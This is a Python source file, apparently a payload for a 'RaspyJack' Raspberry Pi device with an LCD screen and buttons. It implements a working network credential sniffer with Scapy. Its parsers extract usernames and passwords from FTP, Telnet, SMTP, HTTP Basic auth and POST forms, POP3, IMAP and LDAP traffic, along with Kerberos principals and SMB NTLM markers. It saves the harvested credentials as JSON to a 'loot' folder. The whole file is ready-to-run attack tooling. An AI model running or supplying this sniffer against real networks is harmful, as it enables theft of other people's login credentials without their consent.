#!/usr/bin/env python3
"""
RaspyJack Payload -- Multi-Protocol Credential Sniffer
=======================================================
Author: 7h30th3r0n3

Passive credential sniffer using Scapy. Captures cleartext and
encoded credentials from multiple protocols:

  FTP (21), Telnet (23), SMTP (25), HTTP (80), Kerberos (88),
  POP3 (110), IMAP (143), LDAP (389), SMB/NTLM (445)

Controls:
  OK        -- Start / stop sniffing
  UP / DOWN -- Scroll captured credentials
  KEY1      -- Cycle view (by protocol / by time)
  KEY2      -- Export to loot
  KEY3      -- Exit

Loot: /root/Raspyjack/loot/CredSniff/
"""

import os
import sys
import time
import json
import base64
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/CredSniff"
os.makedirs(LOOT_DIR, exist_ok=True)

PROTOCOLS = ["FTP", "Telnet", "SMTP", "HTTP", "Kerberos",
             "POP3", "IMAP", "LDAP", "SMB"]
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
credentials = []        # list of dicts
proto_counts = {p: 0 for p in PROTOCOLS}
status_msg = "Idle"
sniffing = False
running = True
scroll_pos = 0
view_mode = "proto"     # proto | time

_sniff_thread = None

# ---------------------------------------------------------------------------
# Active interface detection
# ---------------------------------------------------------------------------

def _get_active_iface():
    """Return the first interface with a default route."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                idx = parts.index("dev") + 1
                if idx < len(parts):
                    return parts[idx]
    except Exception:
        pass
    return "eth0"


# ---------------------------------------------------------------------------
# Credential capture helpers
# ---------------------------------------------------------------------------

def _add_cred(protocol, src_ip, dst_ip, username, password):
    """Thread-safe credential append."""
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "protocol": protocol,
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "username": username,
        "password": password,
    }
    with lock:
        credentials.append(entry)
        proto_counts[protocol] = proto_counts.get(protocol, 0) + 1


def _safe_b64_decode(data):
    """Attempt base64 decode, return original on failure."""
    try:
        decoded = base64.b64decode(data).decode("utf-8", errors="replace")
        return decoded
    except Exception:
        return data


# ---------------------------------------------------------------------------
# Protocol parsers (called from scapy sniff callback)
# ---------------------------------------------------------------------------

# Session state for multi-packet protocols
_ftp_sessions = {}   # (src,dst) -> {"user": ...}
_pop3_sessions = {}
_smtp_sessions = {}
_telnet_sessions = {}


def _parse_ftp(pkt, payload, src, dst):
    """Parse FTP USER/PASS commands."""
    key = (src, dst)
    upper = payload.upper()
    if upper.startswith("USER "):
        _ftp_sessions[key] = {"user": payload[5:].strip()}
    elif upper.startswith("PASS "):
        user = _ftp_sessions.pop(key, {}).get("user", "<unknown>")
        _add_cred("FTP", src, dst, user, payload[5:].strip())


def _parse_telnet(pkt, payload, src, dst):
    """Heuristic telnet credential detection."""
    key = (src, dst)
    lower = payload.lower()
    if "login:" in lower or "username:" in lower:
        _telnet_sessions[key] = {"state": "expect_user"}
    elif key in _telnet_sessions:
        state = _telnet_sessions[key].get("state", "")
        if state == "expect_user":
            _telnet_sessions[key] = {"state": "expect_pass", "user": payload.strip()}
        elif state == "expect_pass":
            user = _telnet_sessions[key].get("user", "<unknown>")
            _add_cred("Telnet", src, dst, user, payload.strip())
            _telnet_sessions.pop(key, None)


def _parse_smtp(pkt, payload, src, dst):
    """Parse SMTP AUTH LOGIN and AUTH PLAIN."""
    key = (src, dst)
    upper = payload.upper()
    if "AUTH LOGIN" in upper:
        _smtp_sessions[key] = {"state": "expect_user"}
    elif "AUTH PLAIN" in upper:
        parts = payload.split()
        if len(parts) >= 3:
            decoded = _safe_b64_decode(parts[2])
            # AUTH PLAIN format: \x00user\x00pass
            segments = decoded.split("\x00")
            if len(segments) >= 3:
                _add_cred("SMTP", src, dst, segments[1], segments[2])
    elif key in _smtp_sessions:
        state = _smtp_sessions[key].get("state", "")
        if state == "expect_user":
            _smtp_sessions[key] = {
                "state": "expect_pass",
                "user": _safe_b64_decode(payload.strip()),
            }
        elif state == "expect_pass":
            user = _smtp_sessions[key].get("user", "<unknown>")
            _add_cred("SMTP", src, dst, user, _safe_b64_decode(payload.strip()))
            _smtp_sessions.pop(key, None)


def _parse_pop3(pkt, payload, src, dst):
    """Parse POP3 USER/PASS commands."""
    key = (src, dst)
    upper = payload.upper()
    if upper.startswith("USER "):
        _pop3_sessions[key] = {"user": payload[5:].strip()}
    elif upper.startswith("PASS "):
        user = _pop3_sessions.pop(key, {}).get("user", "<unknown>")
        _add_cred("POP3", src, dst, user, payload[5:].strip())


def _parse_imap(pkt, payload, src, dst):
    """Parse IMAP LOGIN command."""
    match = re.search(r'LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?', payload, re.I)
    if match:
        _add_cred("IMAP", src, dst, match.group(1), match.group(2))


def _parse_http(pkt, payload, src, dst):
    """Parse HTTP Basic Auth and POST form credentials."""
    # Basic Auth
    auth_match = re.search(
        r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", payload,
    )
    if auth_match:
        decoded = _safe_b64_decode(auth_match.group(1))
        if ":" in decoded:
            user, passwd = decoded.split(":", 1)
            _add_cred("HTTP", src, dst, user, passwd)

    # POST form data
    if payload.upper().startswith("POST "):
        body_match = re.search(r"\r\n\r\n(.+)", payload, re.DOTALL)
        if body_match:
            body = body_match.group(1)
            user_match = re.search(
                r"(?:user(?:name)?|email|login)=([^&\s]+)", body, re.I,
            )
            pass_match = re.search(
                r"(?:pass(?:word)?|pwd)=([^&\s]+)", body, re.I,
            )
            if user_match and pass_match:
                _add_cred("HTTP", src, dst,
                           user_match.group(1), pass_match.group(1))


def _parse_ldap(pkt, payload, src, dst):
    """Detect LDAP simple bind with DN and password."""
    # Simple bind: look for common DN patterns followed by password bytes
    dn_match = re.search(r"(cn=|uid=|dc=)([^\x00]+)", payload, re.I)
    if dn_match and len(payload) > 20:
        dn_str = payload[payload.find(dn_match.group(0)):]
        # Heuristic: extract printable sequences as potential credentials
        printable = re.findall(r"[\x20-\x7e]{3,}", dn_str)
        if len(printable) >= 2:
            _add_cred("LDAP", src, dst, printable[0], printable[1])


def _parse_kerberos(pkt, payload, src, dst):
    """Extract principal names from Kerberos AS-REQ."""
    # Look for KRB5 AS-REQ pattern and extract realm/principal
    principal_match = re.search(r"([\x20-\x7e]{3,}@[\x20-\x7e]{3,})", payload)
    if principal_match:
        _add_cred("Kerberos", src, dst, principal_match.group(1), "<krb5_as_req>")


def _parse_smb_ntlm(pkt, payload, src, dst):
    """Detect NTLMv2 challenge/response in SMB traffic."""
    if b"NTLMSSP" in payload.encode("latin-1", errors="replace"):
        # Type 3 message (authenticate) has challenge/response
        idx = payload.find("NTLMSSP")
        if idx >= 0 and len(payload) > idx + 12:
            msg_type_byte = ord(payload[idx + 8]) if idx + 8 < len(payload) else 0
            if msg_type_byte == 3:
                # Extract domain/user from NTLMSSP Type 3
                user_match = re.search(r"[\x20-\x7e]{2,}", payload[idx + 36:])
                user_str = user_match.group(0) if user_match else "<ntlm_user>"
                _add_cred("SMB", src, dst, user_str, "<NTLMv2_hash>")


# ---------------------------------------------------------------------------
# Scapy sniff thread
# ---------------------------------------------------------------------------

def _sniff_loop(iface):
    """Main scapy sniff loop."""
    global sniffing
    try:
        from scapy.all import sniff as scapy_sniff, TCP, IP
    except ImportError:
        with lock:
            global status_msg
            status_msg = "scapy not installed!"
        return

    port_parsers = {
        21: _parse_ftp,
        23: _parse_telnet,
        25: _parse_smtp,
        80: _parse_http,
        88: _parse_kerberos,
        110: _parse_pop3,
        143: _parse_imap,
        389: _parse_ldap,
        445: _parse_smb_ntlm,
    }

    def _process_pkt(pkt):
        if not running or not sniffing:
            return
        if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
            return
        try:
            tcp = pkt[TCP]
            ip_layer = pkt[IP]
            raw_payload = bytes(tcp.payload)
            if not raw_payload:
                return
            payload_str = raw_payload.decode("latin-1", errors="replace")
            src = ip_layer.src
            dst = ip_layer.dst
            sport = tcp.sport
            dport = tcp.dport

            for port, parser in port_parsers.items():
                if dport == port or sport == port:
                    parser(pkt, payload_str, src, dst)
                    break
        except Exception:
            pass

    with lock:
        status_msg = f"Sniffing on {iface}..."

    try:
        scapy_sniff(
            iface=iface,
            prn=_process_pkt,
            store=False,
            stop_filter=lambda _: not running or not sniffing,
            filter="tcp",
        )
    except Exception as exc:
        with lock:
            status_msg = f"Sniff error: {exc}"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_creds():
    """Export captured credentials to loot directory."""
    with lock:
        creds_copy = list(credentials)
    if not creds_copy:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(creds_copy, fh, indent=2)
        with lock:
            global status_msg
            status_msg = f"Exported {len(creds_copy)} creds"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "Cred Sniffer", fill="CYAN", font=font)

    with lock:
        st = status_msg
        vm = view_mode
        sp = scroll_pos
        creds = list(credentials)
        counts = dict(proto_counts)

    total = len(creds)
    draw.text((2, 14), f"{st} [{total}]", fill="WHITE", font=font)

    if vm == "proto":
        y = 28
        for proto in PROTOCOLS:
            cnt = counts.get(proto, 0)
            color = "GREEN" if cnt > 0 else "GRAY"
            draw.text((2, y), f"{proto:8s} {cnt}", fill=color, font=font)
            y += 10
            if y > 108:
                break
    else:
        # Time-ordered view
        visible = creds[sp:sp + ROWS_VISIBLE]
        y = 28
        for c in visible:
            ts_short = c["timestamp"].split(" ")[1][:5]
            line = f"{ts_short} {c['protocol'][:4]} {c['username'][:10]}"
            draw.text((2, y), line[:22], fill="GREEN", font=font)
            y += 12

    sniff_label = "ACTIVE" if sniffing else "STOPPED"
    sniff_color = "GREEN" if sniffing else "RED"
    draw.text((2, 116), f"[{sniff_label}] K1=view K3=exit", fill=sniff_color, font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, sniffing, scroll_pos, view_mode, _sniff_thread

    try:
        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    sniffing = not sniffing
                if sniffing:
                    iface = _get_active_iface()
                    _sniff_thread = threading.Thread(
                        target=_sniff_loop, args=(iface,), daemon=True,
                    )
                    _sniff_thread.start()

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_scroll = max(0, len(credentials) - ROWS_VISIBLE)
                    if scroll_pos < max_scroll:
                        scroll_pos += 1

            elif btn == "KEY1":
                with lock:
                    view_mode = "time" if view_mode == "proto" else "proto"
                    scroll_pos = 0

            elif btn == "KEY2":
                threading.Thread(target=_export_creds, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        sniffing = False

        # Wait for sniff thread to finish
        if _sniff_thread and _sniff_thread.is_alive():
            _sniff_thread.join(timeout=3)

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 56), "Sniffer stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
